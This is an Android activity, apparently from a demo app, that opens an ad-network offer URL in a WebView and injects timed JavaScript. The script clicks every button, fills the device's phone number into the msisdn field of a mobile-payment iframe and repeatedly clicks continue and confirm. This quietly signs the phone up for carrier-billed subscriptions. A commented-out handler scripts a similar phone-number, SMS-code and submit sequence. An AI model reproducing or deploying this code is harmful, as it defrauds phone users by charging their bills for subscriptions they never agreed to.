package moziqi.interviewdemo.subscribe;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.Toast;

import java.util.Arrays;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

import moziqi.interviewdemo.R;
import moziqi.interviewdemo.util.LogUtils;
import moziqi.interviewdemo.util.TouchUtils;
import moziqi.interviewdemo.webview.SimulationListener;
import moziqi.interviewdemo.webview.TouchWebView;
import moziqi.interviewdemo.webview.WebViewHelper;

public class SubscribeActivity extends AppCompatActivity {

    private Button mGetPhone;

    private Button mGetMsg;

    private TouchWebView mTouchWebView;

    private TouchUtils touchUtils = new TouchUtils();

    private WebViewHelper webViewHelper = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_subscribe);

        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        getSupportActionBar().setHomeButtonEnabled(true);


        mGetPhone = findViewById(R.id.getPhone);
        mGetMsg = findViewById(R.id.getMsg);
        mTouchWebView = findViewById(R.id.touchWebView);


        webViewHelper = new WebViewHelper(mTouchWebView);


        BlockingQueue<WebViewHelper.WebData> webData = new ArrayBlockingQueue<>(3);
        //String.format("javascript:document.getElementsByClassName('b_algoheader')[%d].getElementsByTagName('a')[0].click();", webViewHelper.getRandom(5))
        webData.add(webViewHelper.createWebData(1, "http://clickmob.c0c.xyz/rest/ck/o/1245/2387042?",
                Arrays.asList(
                        //先点击首页的按钮
                        webViewHelper.createJsObj("javascript:for(var i=0;i<document.getElementsByName('button').length;i++){document.getElementsByName('button')[i].click();}"),
                        //在输入框获取焦点
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').focus();", 15 * 1000),
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].focus();", 15 * 1000),
                        //填充电话号码
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementById('msisdn').value=‘%s’;", 15 * 1000, WebViewHelper.JsObj.JS_TYPE_PHONE),
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('inputbox')[0].value='%s';", 15 * 1000, WebViewHelper.JsObj.JS_TYPE_PHONE),
                        //点击
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();"),
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();"),
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('continue')[0].click();"),
                        //点击这个
                        webViewHelper.createJsObj("javascript:document.getElementById('mpay').contentWindow.document.getElementsByClassName('text-red2')[0].click();")
                )));
        webViewHelper.setData(webData).start();
    }

    @Override
    public void onBackPressed() {
        if (mTouchWebView != null) {
            //如果h5页面可能返回，跳转到上个页面
            if (mTouchWebView.canGoBack()) {
                mTouchWebView.goBack();
            } else {
                //不能返回上个页面，直接finish当前Activity
                finish();
            }
        } else {
            finish();
        }
    }

    @Override
    protected void onDestroy() {
        if (webViewHelper != null) {
            webViewHelper.onDestroy();
        }
        super.onDestroy();

    }

    //    private Handler handler = new Handler(Looper.getMainLooper()) {
//        @Override
//        public void handleMessage(Message msg) {
//            super.handleMessage(msg);
//            LogUtils.i("mo", String.format("msg.what>>%d", msg.what));
//            switch (msg.what) {
//                case 1:
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').value=\"测试人员\"");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('password').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('password').value=\"tmd123456\"");
//
//                    handler.sendEmptyMessageDelayed(2, 5000);
//                    break;
//                case 2:
//                    String phoneNum = PhoneUtils.getPhoneNum(getApplicationContext());
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('phone')[0].focus()");
//
//                    mTouchWebView.loadJs(
//                            String.format("javascript:document.getElementsByClassName('phone')[0].value=\"%s\"",
//                                    TextUtils.isEmpty(phoneNum) ? "13580889531" : phoneNum)
//                    );
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('phone')[0].focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    handler.sendEmptyMessageDelayed(3, 5000);
//                    break;
//                case 3:
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('send-sms').click()");
//
//                    handler.sendEmptyMessageDelayed(4, 5000);
//                    break;
//                case 4:
//                    mTouchWebView.loadJs("javascript:document.getElementById('code').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('code').value=\"112312\"");
//
//                    //刷新焦点
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    handler.sendEmptyMessageDelayed(5, 5000);
//                    break;
//                case 5:
//
//                    //刷新焦点
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('submit')[0].click()");
//                    Toast.makeText(getApplicationContext(), "点击了提交", Toast.LENGTH_SHORT).show();
//                    break;
//                case 6:
//                    break;
//                case 7:
//                    while (mTouchWebView.canGoBack()) {
//                        mTouchWebView.goBack();
//                    }
//                    break;
//                case 8:
//                    mTouchWebView.reload();
//                    break;
//            }
//        }
//    };
}
